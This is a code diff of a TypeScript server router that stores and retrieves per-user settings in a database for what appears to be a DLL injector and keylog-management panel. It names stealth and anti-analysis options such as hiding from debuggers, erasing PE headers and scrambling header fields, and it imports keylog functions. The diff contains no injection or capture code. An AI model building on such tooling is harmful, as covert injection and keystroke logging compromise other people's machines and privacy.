@@ -7,7 +7,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, getAlerts, getEvents } from "./db";
+import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, getAlerts, getEvents, saveSettings, getSettings } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 
 export const appRouter = router({
@@ -220,38 +220,135 @@ export const appRouter = router({
         method: z.number(),
       }))
       .mutation(async ({ input, ctx }) => {
-        console.log("Configurações salvas:", input);
-        return { success: true, message: "Configurações salvas com sucesso!" };
+        try {
+          // Convert boolean to int for database storage
+          const settingsData = {
+            processName: input.processName,
+            modulePath: input.modulePath,
+            hideFromDebugger: input.hideFromDebugger ? 1 : 0,
+            stealthInject: input.stealthInject ? 1 : 0,
+            hideModule: input.hideModule ? 1 : 0,
+            erasePE: input.erasePE ? 1 : 0,
+            autoInject: input.autoInject ? 1 : 0,
+            closeOnInject: input.closeOnInject ? 1 : 0,
+            createFakeDebugDirectory: input.createFakeDebugDirectory ? 1 : 0,
+            createNewEntryPoint: input.createNewEntryPoint ? 1 : 0,
+            insertExtraSections: input.insertExtraSections ? 1 : 0,
+            modifyAssemblyCode: input.modifyAssemblyCode ? 1 : 0,
+            modifyImportTable: input.modifyImportTable ? 1 : 0,
+            moveRelocationTable: input.moveRelocationTable ? 1 : 0,
+            removeDebugData: input.removeDebugData ? 1 : 0,
+            removeUselessData: input.removeUselessData ? 1 : 0,
+            renameSections: input.renameSections ? 1 : 0,
+            scrambleHeaderFields: input.scrambleHeaderFields ? 1 : 0,
+            shiftSectionData: input.shiftSectionData ? 1 : 0,
+            shiftSectionMemory: input.shiftSectionMemory ? 1 : 0,
+            stripSectionCharacteristics: input.stripSectionCharacteristics ? 1 : 0,
+            delay: input.delay,
+            delayBetween: input.delayBetween,
+            method: input.method,
+          };
+          
+          await saveSettings(ctx.user.id, settingsData);
+          return { success: true, message: "Configurações salvas com sucesso!" };
+        } catch (error) {
+          console.error("Erro ao salvar configurações:", error);
+          throw error;
+        }
       }),
 
     get: protectedProcedure
       .query(async ({ ctx }) => {
-        return {
-          processName: "_Remote.exe",
-          modulePath: "C:\\Users\\root\\Desktop\\0x29aRT.dll",
-          hideFromDebugger: false,
-          stealthInject: false,
-          hideModule: false,
-          erasePE: false,
-          autoInject: false,
-          closeOnInject: false,
-          createFakeDebugDirectory: false,
-          createNewEntryPoint: false,
-          insertExtraSections: false,
-          modifyAssemblyCode: false,
-          modifyImportTable: false,
-          moveRelocationTable: false,
-          removeDebugData: false,
-          removeUselessData: false,
-          renameSections: false,
-          scrambleHeaderFields: false,
-          shiftSectionData: false,
-          shiftSectionMemory: false,
-          stripSectionCharacteristics: false,
-          delay: 0,
-          delayBetween: 0,
-          method: 0,
-        };
+        try {
+          const userSettings = await getSettings(ctx.user.id);
+          
+          if (userSettings) {
+            // Convert int back to boolean for frontend
+            return {
+              processName: userSettings.processName,
+              modulePath: userSettings.modulePath,
+              hideFromDebugger: userSettings.hideFromDebugger === 1,
+              stealthInject: userSettings.stealthInject === 1,
+              hideModule: userSettings.hideModule === 1,
+              erasePE: userSettings.erasePE === 1,
+              autoInject: userSettings.autoInject === 1,
+              closeOnInject: userSettings.closeOnInject === 1,
+              createFakeDebugDirectory: userSettings.createFakeDebugDirectory === 1,
+              createNewEntryPoint: userSettings.createNewEntryPoint === 1,
+              insertExtraSections: userSettings.insertExtraSections === 1,
+              modifyAssemblyCode: userSettings.modifyAssemblyCode === 1,
+              modifyImportTable: userSettings.modifyImportTable === 1,
+              moveRelocationTable: userSettings.moveRelocationTable === 1,
+              removeDebugData: userSettings.removeDebugData === 1,
+              removeUselessData: userSettings.removeUselessData === 1,
+              renameSections: userSettings.renameSections === 1,
+              scrambleHeaderFields: userSettings.scrambleHeaderFields === 1,
+              shiftSectionData: userSettings.shiftSectionData === 1,
+              shiftSectionMemory: userSettings.shiftSectionMemory === 1,
+              stripSectionCharacteristics: userSettings.stripSectionCharacteristics === 1,
+              delay: userSettings.delay,
+              delayBetween: userSettings.delayBetween,
+              method: userSettings.method,
+            };
+          }
+          
+          // Return default settings if none exist
+          return {
+            processName: "_Remote.exe",
+            modulePath: "C:\\Users\\root\\Desktop\\0x29aRT.dll",
+            hideFromDebugger: false,
+            stealthInject: false,
+            hideModule: false,
+            erasePE: false,
+            autoInject: false,
+            closeOnInject: false,
+            createFakeDebugDirectory: false,
+            createNewEntryPoint: false,
+            insertExtraSections: false,
+            modifyAssemblyCode: false,
+            modifyImportTable: false,
+            moveRelocationTable: false,
+            removeDebugData: false,
+            removeUselessData: false,
+            renameSections: false,
+            scrambleHeaderFields: false,
+            shiftSectionData: false,
+            shiftSectionMemory: false,
+            stripSectionCharacteristics: false,
+            delay: 0,
+            delayBetween: 0,
+            method: 0,
+          };
+        } catch (error) {
+          console.error("Erro ao recuperar configurações:", error);
+          // Return default settings on error
+          return {
+            processName: "_Remote.exe",
+            modulePath: "C:\\Users\\root\\Desktop\\0x29aRT.dll",
+            hideFromDebugger: false,
+            stealthInject: false,
+            hideModule: false,
+            erasePE: false,
+            autoInject: false,
+            closeOnInject: false,
+            createFakeDebugDirectory: false,
+            createNewEntryPoint: false,
+            insertExtraSections: false,
+            modifyAssemblyCode: false,
+            modifyImportTable: false,
+            moveRelocationTable: false,
+            removeDebugData: false,
+            removeUselessData: false,
+            renameSections: false,
+            scrambleHeaderFields: false,
+            shiftSectionData: false,
+            shiftSectionMemory: false,
+            stripSectionCharacteristics: false,
+            delay: 0,
+            delayBetween: 0,
+            method: 0,
+          };
+        }
       }),
   }),
 });
